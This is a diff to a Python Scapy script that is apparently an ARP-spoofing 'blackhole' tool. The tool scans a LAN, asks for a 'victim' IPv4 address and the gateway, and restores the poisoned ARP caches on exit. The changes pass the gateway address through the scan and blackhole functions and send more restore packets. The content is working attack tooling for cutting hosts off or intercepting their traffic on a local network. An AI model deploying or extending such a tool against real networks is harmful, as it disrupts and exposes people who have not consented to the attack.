@@ -19,7 +19,7 @@ def welcome():
 	print('\n\n')
 
 
-def sniff(ipv4, interface):
+def sniff(ipv4, gateway_ipv4, interface):
 	cprint("Sniffing...", 'blue', attrs = ['bold'])
 	print('\n\n')
 	resp,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ipv4),
@@ -30,6 +30,11 @@ def sniff(ipv4, interface):
 	ip_mac = {}
 	for x in resp:
 		ip_mac[str(x[1][ARP].psrc)] = str(x[1][Ether].src)
+	if '/' not in ipv4:
+		resp_g,unans_g=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gateway_ipv4),
+			timeout=2, verbose=False, iface=interface)
+		for x in resp_g:
+			ip_mac[str(x[1][ARP].psrc)] = str(x[1][Ether].src)
 	return ip_mac	
 
 
@@ -41,25 +46,24 @@ def spoofMac():
 def reverse_blackhole(opt, victim_ipv4, gateway_ipv4, victim_mac, gateway_mac):
 	if opt == 1:
 		packet = ARP(op=2, psrc=gateway_ipv4, hwsrc=gateway_mac, pdst=victim_ipv4, hwdst=victim_mac)
-		for i in range(20):
+		for i in range(50):
 			send(packet, verbose = False)
 	else:
 		packet = ARP(op=2, psrc=victim_ipv4, hwsrc=victim_mac, pdst=gateway_ipv4, hwdst=gateway_mac)
-		for i in range(20):
+		for i in range(50):
 			send(packet, verbose = False)
 	print('\n\n')		
 	cprint('Restored. Enjoy. Exiting...', 'yellow', attrs = ['bold'])
 	print('\n\n')
 
 
-def blackhole(ip_mac):
+def blackhole(ip_mac, gateway_ipv4):
 	print('\n\n')
 	if not bool(ip_mac):
 			print('No hosts found on LAN')
 	else:
 		victim_ipv4 = str(raw_input('Enter victim\'s IPv4 : ')).strip()
-		print('\n')
-		gateway_ipv4 = str(raw_input('Enter Gateway\'s IPv4 : ')).strip()
+		print('\n')		
 		victim_mac = ip_mac[victim_ipv4]
 		gateway_mac = ip_mac[gateway_ipv4]
 		print('\n\n')
@@ -98,7 +102,9 @@ if __name__ == '__main__':
 		welcome()
 		ipv4_or_ipv4cidr = str(raw_input('Enter IPv4 or CIDR (192.168.1.23 or 192.168.1.0/24) : ')).strip()
 		print('\n')
+		gateway_ipv4 = str(raw_input('Enter Gateway\'s IPv4 : ')).strip()
+		print('\n')
 		interface = str(raw_input('Enter interface : ')).strip()
 		print('\n')
-		ip_mac = sniff(ipv4_or_ipv4cidr, interface)
-		blackhole(ip_mac)
+		ip_mac = sniff(ipv4_or_ipv4cidr, gateway_ipv4, interface)
+		blackhole(ip_mac, gateway_ipv4)
